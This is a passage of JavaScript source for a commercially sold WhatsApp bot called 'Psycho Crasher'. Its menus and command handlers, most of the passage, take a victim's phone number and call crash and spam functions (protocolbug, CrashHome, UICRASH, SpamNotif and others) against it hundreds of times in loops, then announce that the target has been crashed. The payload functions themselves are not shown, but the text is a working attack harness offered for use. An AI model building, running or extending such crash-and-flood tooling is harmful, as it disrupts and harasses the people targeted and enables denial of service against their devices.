┃𝜩 Mode : ${FadelSM.public ? 'public' : 'self'}
┃𝜩 Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
┃𝜩 𝙍𝙐𝙉𝙏𝙄𝙈𝙀 :  ${runtime(process.uptime())}
┃𝜩 Version : ${global.versi}
┃𝜩 𝗟𝗮𝗻𝗴𝗴𝘂𝗲 : JavaScript
┃𝜩 𝗡𝗮𝗺𝗲 𝗕𝗼𝘁 : 𝐏𝐒𝐘𝐂𝐇𝐎 𝐂𝐑𝐀𝐒𝐇𝐄𝐑
╰━─────━❏
`;
    FadelSM.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg"
        },
        caption: Menu,
        buttons: [
      {
             buttonId: ".bugmenu", 
             buttonText: {
                 displayText: 'Bug Menu'
             }
      }, {
             buttonId: ". ownermenu", 
             buttonText: {
                 displayText: 'Menu Owner'
             }
      }, {
             buttonId: ".tqto", 
             buttonText: {
                 displayText: 'ThanksToo'
         }
       }
],
   viewOnce: true,
   headerType: 6,
   }, { quoted: m });
}
break;

       case "cekid": {
    if (!m.isGroup) return m.reply("Fitur ini hanya bisa digunakan dalam grup!");
    
    let groupId = m.chat; // ID grup akan otomatis didapat dari chat ID
    let groupMetadata = await FadelSM.groupMetadata(groupId);
    let groupName = groupMetadata.subject; // Nama grup
    
    let replyMessage = `
\`🧸 𝗚 𝗥 𝗢 𝗨 𝗣 𝗜 𝗗\`
📌 *Nama Grup:* ${groupName}
🆔 *ID Grup:* ${groupId}

🔮 Gunakan ID ini untuk keperluan administrasi.`;

    m.reply(replyMessage);
}
break;

case 'brat': {
            if (!isPremium && users.limit < 0) return reply(mess.limited); 
            users.limit -= 1;
            if (isBan) return
            if (!text) return reply(`mana text nya? contoh ${prefix + command} Butuh Bokep`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${text}`;
            await reaction(m.chat, "⚡")
            await makeStickerFromUrl(imageUrl, FadelSM, m);
        }
       break

case "bugmenu": {
let Ror = `
> [ ⼢ ] 𝗛𝗶 𝗞𝗼𝗻𝗻𝗶𝗰𝗵𝗶𝘄𝗮, 👋 ${pushname} 𝗢𝗵𝗮𝘆𝗼𝗼 🕊

\`🧸 𝗣 𝗦 𝗬 𝗖 𝗛 𝗢 𝐂 𝐑 𝐀 𝐒 𝐇\`
╭━[ 𝗔𝗟𝗟 𝗠𝗘𝗡𝗨 𝗕𝗨𝗚 ]
┃ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠
┃𝜩 Time : ${ucapanWaktu}
┃𝜩 Status : Vip Buy Only! 
┃𝜩 Mode : ${FadelSM.public ? 'public' : 'self'}
┃𝜩 Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
┃𝜩 𝙍𝙐𝙉𝙏𝙄𝙈𝙀 :  ${runtime(process.uptime())}
┃𝜩 Version : ${global.versi}
┃ 𝗟𝗮𝗻𝗴𝗴𝘂𝗲 : JavaScript
┃ 𝗡𝗮𝗺𝗮 𝗯𝗼𝘁 : 𝐏𝐒𝐘𝐂𝐇𝐎 𝐂𝐑𝐀𝐒𝐇𝐄𝐑
╰━━━━━❍
╭━[ 𝗖𝗥𝗔𝗦𝗛 & DELAY INVIS]
┃.delay-stc 628×××××
┃.protoxaudio 628×××××
┃.invisxproto 628×××××
┃.beta 628×××××
┃.combinegcor 628×××××
┃.flowdex 628×××××
┃.flowfc 628×××××
┃.protoxoverflow 628×××××
┃.xtrash 628×××××
┃.flowinfine 628×××××
┃.blackscreen 628×××××
┃.tesbug 628×××××
┃.tesbug2 628×××××
┃.tesbug3 628×××××
┃.executive 628×××××
┃.crash-ios 628×××××
┃.system-ui 628×××××
┃.lock-uisystem 628×××××
┃.crashperma 628×××××
┃.fclose 628×××××
╰━━━━━❍

╭━[ CRASH GRUP ]
┃.attackgc linkgrup
╰━━━━━❍`;
    FadelSM.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg"
        },
        caption: Ror,
        footer: `ヂ psycho - crasher`, 
        buttons: [
      {
             buttonId: ".menu", 
             buttonText: {
                 displayText: '𝗕𝗮𝗰𝗸 To Menu'
             }
      },  
            {
             buttonId: ".ownermenu", 
             buttonText: {
                 displayText: '𝗢𝘄𝗻𝗲𝗿𝗠𝗲𝗻𝘂'
             }
      },
],
   viewOnce: true,
   headerType: 6,
   }, { quoted: m });
}
break;

case 'buy': {
let contactVCard = `BEGIN:VCARD
VERSION:3.0
FN:Fadel-Dev
TEL;waid=6283139073473:+6283139073473
END:VCARD`;

    let contactMessage = {
        contacts: {
            displayName: "Fadel Developer",
            contacts: [{ vcard: contactVCard }]
        }
    };

    let textMessage = {
        text: "Beli Script Disini"
    };

    // Kirim kontak
    await FadelSM.sendMessage(m.chat, contactMessage, { quoted: m });

    // Kirim pesan teks setelahnya
    await FadelSM.sendMessage(m.chat, textMessage, { quoted: m });
}
break;

        case "ownermenu": {
    let imageUrl = "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg"; // Ganti dengan URL gambar yang diinginkan
    let captionText = `
> [ ⼢ ] Hi Konnichiwa, 👋 ${pushname} Ohayoo 🕊

\`🧸 𝗜 𝗡 𝗙 𝗢\`
╭━─━⊱ ⧼ 𝐈𝐍𝐅𝐎 ⧽
┃𝜩 Time : ${ucapanWaktu}
┃𝜩 Status : Vip Buy Only! 
┃𝜩 Mode : ${FadelSM.public ? 'public' : 'self'}
┃𝜩 Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
┃𝜩 𝙍𝙐𝙉𝙏𝙄𝙈𝙀 :  ${runtime(process.uptime())}
┃𝜩 Version : ${global.versi}
┃𝜩 *𝗡𝗮𝗺𝗮 𝗕𝗼𝘁* : 𝐏𝐒𝐘𝐂𝐇𝐎 𝐂𝐑𝐀𝐒𝐇𝐄𝐑
┃𝜩 *𝗗𝗲𝘃*: 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠
╰━─────━❏
╭━─━⊱ ⧼ 𝐎𝐖𝐍-𝐌𝐄𝐍𝐔 ⧽
┃» .addprem : *Number*
┃» .hidetag : *Message*
┃» .delprem : *Number*
┃» .cekidch : *linkchannel*
╰━───────────━❏`;

    await FadelSM.sendMessage(m.chat, {
        image: { url: imageUrl }, // Mengambil gambar dari URL
        caption: captionText // Menambahkan teks di bawah gambar
    }, { quoted: m });
}
break;
        
// Handler untuk tombol yang ditekan
        
        
        
        // CASE CRASH WANGSAPP //
case "protoxoverflow": {
    if (!Access) return m.reply(mess.owner);
    let target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    if (!target) return m.reply("Gunakan tombol dengan benar!");

    // Mengirim gambar, caption, dan button saat proses
    let Menu = `
\`🧸 𝗣 𝗥 𝗢 𝗖 𝗘 𝗦 𝗦\`
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" // Ganti URL gambar sesuai kebutuhan
        },
        caption: Menu,
        footer: `</> [ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ] </>`,
        buttons: [
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝐁͢𝐮𝐲 𝐒𝐜͢𝐫𝐢𝐩𝐭᭄'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });

    // Simulasi waktu proses
    let startTime = Date.now();

    for (let i = 0; i < 50; i++) {
        await protocolbug4(target)
        await protocolbug4(target)
        await OverflowPayload(target) 
        await OverflowPayload(target) 
    }
    await sleep(10);

    // Waktu selesai
    let endTime = Date.now();
    let elapsedTime = ((endTime - startTime) / 1000).toFixed(2);

    // Kirim hasil akhir
    const resultImageUrl = 'https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg'; // Ganti URL sesuai kebutuhan
    const resultCaption =`
\`🧸 𝗗 𝗢 𝗡 𝗘\`
> ᴛᴀʀɢᴇᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴀsʜᴇᴅ
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: resultImageUrl
        },
        caption: resultCaption,
        footer: "</> [ 𝗗𝗼𝗻𝗲 𝗕𝗿𝗼 ] </>",
        buttons: [
            {
                buttonId: ".menu", 
                buttonText: {
                    displayText: '𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂'
                }
            },
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝗕𝘂𝘆 𝗦𝗰𝗿𝗶𝗽𝘁'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });
}
break;

case "xtrash": {
    if (!Access) return m.reply(mess.owner);
    let target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    if (!target) return m.reply("Gunakan tombol dengan benar!");

    // Mengirim gambar, caption, dan button saat proses
    let Menu = `
\`🧸 𝗣 𝗥 𝗢 𝗖 𝗘 𝗦 𝗦\`
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" // Ganti URL gambar sesuai kebutuhan
        },
        caption: Menu,
        footer: `</> [ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ] </>`,
        buttons: [
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝐁͢𝐮𝐲 𝐒𝐜͢𝐫𝐢𝐩𝐭᭄'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });

    // Simulasi waktu proses
    let startTime = Date.now();

    for (let i = 0; i < 50; i++) {
        await SpaceGroup(target) 
        await SpaceGroup(target) 
        await SpaceGroup(target) 
        await SpaceGroup(target)  
        await VampFcSpam(target)
        await VampHardUi(target, Ptcp = false)
        await VampPrivateBlank(target)
    }
    await sleep(1000);

    // Waktu selesai
    let endTime = Date.now();
    let elapsedTime = ((endTime - startTime) / 1000).toFixed(2);

    // Kirim hasil akhir
    const resultImageUrl = 'https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg'; // Ganti URL sesuai kebutuhan
    const resultCaption =`
\`🧸 𝗗 𝗢 𝗡 𝗘\`
> ᴛᴀʀɢᴇᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴀsʜᴇᴅ
𝐓𝐚𝐫𝐠𝐞𝐭 : ${target}
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠`;

    await FadelSM.sendMessage(m.chat, {
        image: {
            url: resultImageUrl
        },
        caption: resultCaption,
        footer: "</> [ 𝗗𝗼𝗻𝗲 𝗕𝗿𝗼 ] </>",
        buttons: [
            {
                buttonId: ".menu", 
                buttonText: {
                    displayText: '𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂'
                }
            },
            {
                buttonId: ".buy", 
                buttonText: {
                    displayText: '𝗕𝘂𝘆 𝗦𝗰𝗿𝗶𝗽𝘁'
                }
            }
        ],
        viewOnce: true,
        headerType: 6
    }, { quoted: m });
}
break;

case "flowinfinite": {
if (!Access) return m.reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) { 
return await FadelSM.sendMessage(m.chat, { text: `Contoh : .${command} 628xxx (628012345678)` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan awal proses
    await FadelSM.sendMessage(m.chat, {
        image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
        caption: "𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .🚀",
        contextInfo: {
            externalAdReply: {
                title: `𝕭𝖚𝖌𝖌𝖎𝖓 𝕭𝖞 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                body: "𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀",
                sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
            },
        },
    });
const total = 100;
for (let i = 0; i < total; i++) {
if (i === 10) {
         await FadelSM.sendMessage(m.chat, {
              image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
                caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .✅`,
                contextInfo: {
                    externalAdReply: {
                        title: `© 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                        body: "𝐃𝐨𝐧𝐞 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠 𝐁𝐲 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹",
                        sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
                    },
                },
            });
        }

        // Panggil fungsi crash
        await protocolbug(org);
        await CrashHome(org);
        await Crashed(org);
        await VPen(org, true);

        await sleep(1000);
    }
}

break;

case "blackscreen":
case "trashxblack": {
if (!Access) return m.reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) { 
return await FadelSM.sendMessage(m.chat, { text: `Contoh : .${command} 628xxx (628012345678)` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan awal proses
    await FadelSM.sendMessage(m.chat, {
        image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
        caption: "𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .🚀",
        contextInfo: {
            externalAdReply: {
                title: `𝕭𝖚𝖌𝖌𝖎𝖓 𝕭𝖞 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                body: "𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀",
                sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
            },
        },
    });
const total = 100;
for (let i = 0; i < total; i++) {
if (i === 10) {
         await FadelSM.sendMessage(m.chat, {
              image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
                caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .✅`,
                contextInfo: {
                    externalAdReply: {
                        title: `© 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                        body: "𝐃𝐨𝐧𝐞 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠 𝐁𝐲 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹",
                        sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
                    },
                },
            });
        }

        // Panggil fungsi crash
        await BlankScreen(org, true);
        await Loca(org);
        await trashinfinity(org);

        await sleep(1000);
    }
}

break;

case "tesbug": {
if (!Access) return m.reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) { 
return await FadelSM.sendMessage(m.chat, { text: `Contoh : .${command} 628xxx (628012345678)` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan awal proses
    await FadelSM.sendMessage(m.chat, {
        image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
        caption: "𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .🚀",
        contextInfo: {
            externalAdReply: {
                title: `𝕭𝖚𝖌𝖌𝖎𝖓 𝕭𝖞 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                body: "𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀",
                sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
            },
        },
    });
const total = 100;
for (let i = 0; i < total; i++) {
if (i === 10) {
         await FadelSM.sendMessage(m.chat, {
              image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
                caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .✅`,
                contextInfo: {
                    externalAdReply: {
                        title: `© 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                        body: "𝐃𝐨𝐧𝐞 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠 𝐁𝐲 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹",
                        sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
                    },
                },
            });
        }

        // Panggil fungsi crash
        await protocolbug(org);
        await CrashHome(org);
        await SpamNotif(org, true);
        await trashinfinity(org);

        await sleep(1000);
    }
}

break;

case "executive": {
if (!Access) return m.reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) { 
return await FadelSM.sendMessage(m.chat, { text: `Contoh : .${command} 628xxx (628012345678)` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan awal proses
    await FadelSM.sendMessage(m.chat, {
        image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
        caption: "𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .🚀",
        contextInfo: {
            externalAdReply: {
                title: `𝕭𝖚𝖌𝖌𝖎𝖓 𝕭𝖞 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                body: "𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀",
                sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
            },
        },
    });
const total = 100;
for (let i = 0; i < total; i++) {
if (i === 10) {
         await FadelSM.sendMessage(m.chat, {
              image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
                caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .✅`,
                contextInfo: {
                    externalAdReply: {
                        title: `© 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                        body: "𝐃𝐨𝐧𝐞 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠 𝐁𝐲 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹",
                        sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
                    },
                },
            });
        }

        // Panggil fungsi crash
        await trashinfinity(org);
        await UICRASH(org, true);
        await SystemUi(org);
        await SpamNotif(org, true)
        await VPen(org, true);

        await sleep(1000);
    }
}

break;

case "crashios": {
if (!Access) return m.reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) { 
return await FadelSM.sendMessage(m.chat, { text: `Contoh : .${command} 628xxx (628012345678)` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan awal proses
    await FadelSM.sendMessage(m.chat, {
        image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
        caption: "𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .🚀",
        contextInfo: {
            externalAdReply: {
                title: `𝕭𝖚𝖌𝖌𝖎𝖓 𝕭𝖞 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                body: "𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀",
                sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
            },
        },
    });
const total = 500;
for (let i = 0; i < total; i++) {
if (i === 10) {
         await FadelSM.sendMessage(m.chat, {
              image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
                caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .✅`,
                contextInfo: {
                    externalAdReply: {
                        title: `© 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                        body: "𝐃𝐨𝐧𝐞 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠 𝐁𝐲 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹",
                        sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
                    },
                },
            });
        }

        // Panggil fungsi crash
        await Crashed(org);
        await protocolbug(org);
        await trashinfinity(org);

        await sleep(1000);
    }
}

break;

case "system-ui": {
if (!Access) return m.reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) { 
return await FadelSM.sendMessage(m.chat, { text: `Contoh : .${command} 628xxx (628012345678)` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan awal proses
    await FadelSM.sendMessage(m.chat, {
        image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
        caption: "𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .🚀",
        contextInfo: {
            externalAdReply: {
                title: `𝕭𝖚𝖌𝖌𝖎𝖓 𝕭𝖞 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                body: "𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀",
                sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
            },
        },
    });
const total = 500;
for (let i = 0; i < total; i++) {
if (i === 10) {
         await FadelSM.sendMessage(m.chat, {
              image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
                caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .✅`,
                contextInfo: {
                    externalAdReply: {
                        title: `© 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                        body: "𝐃𝐨𝐧𝐞 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠 𝐁𝐲 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹",
                        sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
                    },
                },
            });
        }

        // Panggil fungsi crash
        await protocolbug(org);
        await CrashHome(org);
        await VPen(org, true);

        await sleep(1000);
    }
}

break;

case "lock-uisystem": {
if (!Access) return m.reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) { 
return await FadelSM.sendMessage(m.chat, { text: `Contoh : .${command} 628xxx (628012345678)` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan awal proses
    await FadelSM.sendMessage(m.chat, {
        image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
        caption: "𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .🚀",
        contextInfo: {
            externalAdReply: {
                title: `𝕭𝖚𝖌𝖌𝖎𝖓 𝕭𝖞 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                body: "𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀",
                sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
            },
        },
    });
const total = 500;
for (let i = 0; i < total; i++) {
if (i === 10) {
         await FadelSM.sendMessage(m.chat, {
              image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
                caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .✅`,
                contextInfo: {
                    externalAdReply: {
                        title: `© 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                        body: "𝐃𝐨𝐧𝐞 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠 𝐁𝐲 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹",
                        sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
                    },
                },
            });
        }

        // Panggil fungsi crash
        await Crashed(org);
        await CrashHome(org);
        await CrashHome(org);
        await Crashed(org);
        await SpamNotif(org, true);
        await VPen(org, true);

        await sleep(1000);
    }
}

break;

case "crashperma": {
if (!Access) return m.reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗻𝗱 𝗢𝘄𝗻𝗲𝗿");
if (!text) { 
return await FadelSM.sendMessage(m.chat, { text: `Contoh : .${command} 628xxx (628012345678)` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan awal proses
    await FadelSM.sendMessage(m.chat, {
        image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
        caption: "𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .🚀",
        contextInfo: {
            externalAdReply: {
                title: `𝕭𝖚𝖌𝖌𝖎𝖓 𝕭𝖞 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                body: "𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀",
                sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
            },
        },
    });
const total = 500;
for (let i = 0; i < total; i++) {
if (i === 10) {
         await FadelSM.sendMessage(m.chat, {
              image: { url: "https://img1.pixhost.to/images/5619/596574956_imgtmp.jpg" },
                caption: `𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝘂𝗴. . .✅`,
                contextInfo: {
                    externalAdReply: {
                        title: `© 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹`,
                        body: "𝐃𝐨𝐧𝐞 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠 𝐁𝐲 𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹",
                        sourceUrl: "https://whatsapp.com/channel/0029VaxkfpeG8l55XNsBaq3Q",
                    },
                },
            });
        }

        // Panggil fungsi crash
        await UICRASH(org, true);
        await UICRASH(org, true);
        await trashinfinity(org);
        await trashinfinity(org);
        await SpamNotif(org, true);

        await sleep(1000);
    }
}

break;

case "fclose": {
    if (!Access) return m.reply(mess.owner);
    let target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    if (!target) return m.reply("Gunakan tombol dengan benar!");

    // Mengirim gambar, caption, dan button saat proses
    let Menu = `
